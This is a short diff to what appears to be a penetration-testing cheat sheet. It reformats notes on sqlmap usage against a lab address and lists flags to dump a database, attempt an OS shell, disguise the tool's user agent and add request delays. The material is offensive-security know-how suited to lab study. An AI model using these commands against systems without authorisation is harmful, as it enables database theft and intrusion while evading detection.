@@ -760,4 +760,9 @@ Tricks:
 ```
 sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
 ```
-Other flags: `--dump` to dump all contents of the database. `--dbms {{dbmsname}}`. `--os-shell` to try to pop a shell.
+Other flags:
+- `--dump` to dump all contents of the database.
+- `--dbms {{dbmsname}}`
+- `--os-shell` to try to pop a shell
+- `--random-agent` to use a real user agent (otherwise it will use sqlmap).
+- `--delay=0.2`
